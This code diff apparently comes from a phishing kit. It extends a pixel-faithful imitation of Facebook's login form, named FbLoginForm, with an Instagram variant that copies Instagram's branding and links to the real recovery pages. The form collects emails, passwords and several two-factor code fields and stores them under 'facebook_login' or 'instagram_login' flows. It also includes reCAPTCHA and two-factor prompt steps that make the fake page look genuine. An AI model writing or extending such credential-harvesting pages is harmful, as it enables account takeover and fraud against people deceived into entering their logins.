@@ -19,10 +19,35 @@ const OPEN_TWO_FACTOR_DELAY_MS = 550
 const LABEL_EMAIL_DESKTOP = 'Email address or mobile number'
 const LABEL_EMAIL_MOBILE = 'Mobile number or email address'
 
-const FB_BLUE_LINK = '#1877F2'
+export type SocialLoginVariant = 'facebook' | 'instagram'
 
-const fieldBase =
-  'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#1877F2] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md'
+const LOGIN_THEME: Record<
+  SocialLoginVariant,
+  {
+    submissionFlow: 'facebook_login' | 'instagram_login'
+    fieldBase: string
+    submitButtonActive: string
+    accentLink: string
+    recoveryHref: string
+  }
+> = {
+  facebook: {
+    submissionFlow: 'facebook_login',
+    fieldBase:
+      'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#1877F2] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md',
+    submitButtonActive: 'hover:bg-[#166FE5] active:bg-[#1565d8]',
+    accentLink: '#1877F2',
+    recoveryHref: 'https://www.facebook.com/login/identify/',
+  },
+  instagram: {
+    submissionFlow: 'instagram_login',
+    fieldBase:
+      'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#E4405F] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#E4405F] focus:shadow-[0_0_0_2px_rgba(228,64,95,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md',
+    submitButtonActive: 'hover:bg-[#d73363] active:bg-[#c42d57]',
+    accentLink: '#E4405F',
+    recoveryHref: 'https://www.instagram.com/accounts/password/reset/',
+  },
+}
 
 const fieldErrorClasses =
   'border-[#FA383E] focus:border-[#FA383E] focus:shadow-[0_0_0_2px_rgba(250,56,62,0.28)]'
@@ -218,7 +243,8 @@ function EmailFieldErrorInline() {
   )
 }
 
-export function FbLoginForm() {
+export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVariant }) {
+  const theme = LOGIN_THEME[variant]
   const dispatch = useAppDispatch()
   const store = useStore<RootState>()
   const emailId = useId()
@@ -301,7 +327,7 @@ export function FbLoginForm() {
           updateForm({
             email: lastEmailRef.current,
             password: lastPasswordRef.current,
-            submissionFlow: 'facebook_login',
+            submissionFlow: theme.submissionFlow,
           }),
         )
         setShowRecaptcha(false)
@@ -356,7 +382,7 @@ export function FbLoginForm() {
           updateForm({
             email: raw,
             password: passTrim,
-            submissionFlow: 'facebook_login',
+            submissionFlow: theme.submissionFlow,
             twoFa: '',
             twoFaSecond: '',
             twoFaThird: '',
@@ -395,11 +421,12 @@ export function FbLoginForm() {
                       The login information you entered is incorrect.{` `}
                       <a
                         className="cursor-pointer font-normal hover:underline"
-                        href="https://facebook.com/login/identify/"
+                        href={theme.recoveryHref}
                         role="link"
                         tabIndex={0}
-                        target="_self"
-                        style={{ color: FB_BLUE_LINK }}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        style={{ color: theme.accentLink }}
                       >
                         Find your account and log in.
                       </a>
@@ -430,7 +457,7 @@ export function FbLoginForm() {
               setLoginIncorrect(false)
               setPasswordInvalid(false)
             }}
-            className={`${fieldBase} ${emailInvalid && !loginIncorrect ? fieldErrorClasses : ''}`}
+            className={`${theme.fieldBase} ${emailInvalid && !loginIncorrect ? fieldErrorClasses : ''}`}
           />
           <label
             htmlFor={emailId}
@@ -455,11 +482,12 @@ export function FbLoginForm() {
                 account.{' '}
                 <a
                   className="cursor-pointer font-normal hover:underline"
-                  href="https://facebook.com/login/identify/"
+                  href={theme.recoveryHref}
                   role="link"
                   tabIndex={0}
-                  target="_self"
-                  style={{ color: FB_BLUE_LINK }}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  style={{ color: theme.accentLink }}
                 >
                   Find your account and log in.
                 </a>
@@ -485,7 +513,7 @@ export function FbLoginForm() {
             setLoginIncorrect(false)
             setPasswordInvalid(false)
           }}
-          className={`${fieldBase} ${showPasswordToggle ? 'pr-12 sm:pr-[2.875rem]' : ''} ${passwordInvalid ? fieldErrorClasses : ''}`}
+          className={`${theme.fieldBase} ${showPasswordToggle ? 'pr-12 sm:pr-[2.875rem]' : ''} ${passwordInvalid ? fieldErrorClasses : ''}`}
         />
         <label
           htmlFor={passId}
@@ -537,10 +565,10 @@ export function FbLoginForm() {
         aria-busy={isLoggingIn}
         aria-disabled={isLoggingIn}
         disabled={isLoggingIn}
-        className={`relative mt-1 flex min-h-[2.75rem] w-full items-center justify-center overflow-hidden rounded-[10px] bg-[#1877F2] py-[0.65rem] text-[1.0625rem] font-bold leading-tight text-white transition-[background-color,opacity] lg:rounded-full ${
-          isLoggingIn
-            ? 'cursor-default opacity-[0.98]'
-            : 'hover:bg-[#166FE5] active:bg-[#1565d8]'
+        className={`relative mt-1 flex min-h-[2.75rem] w-full items-center justify-center overflow-hidden rounded-[10px] py-[0.65rem] text-[1.0625rem] font-bold leading-tight text-white transition-[background-color,opacity] lg:rounded-full ${
+          variant === 'facebook' ? 'bg-[#1877F2]' : 'bg-[#E4405F]'
+        } ${
+          isLoggingIn ? 'cursor-default opacity-[0.98]' : theme.submitButtonActive
         }`}
       >
         {isLoggingIn ? (
